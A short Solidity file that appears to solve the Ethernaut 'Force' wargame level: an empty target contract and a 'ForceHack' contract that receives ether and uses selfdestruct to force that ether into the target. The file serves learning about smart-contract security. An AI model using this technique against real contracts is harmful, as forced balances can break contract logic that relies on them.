// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceHack{
    Force force;

    constructor (Force _force) public{
        force = _force;
    }

    function kill() public{
        selfdestruct(payable(address(force)));
    }

    receive() external payable{

    }
}
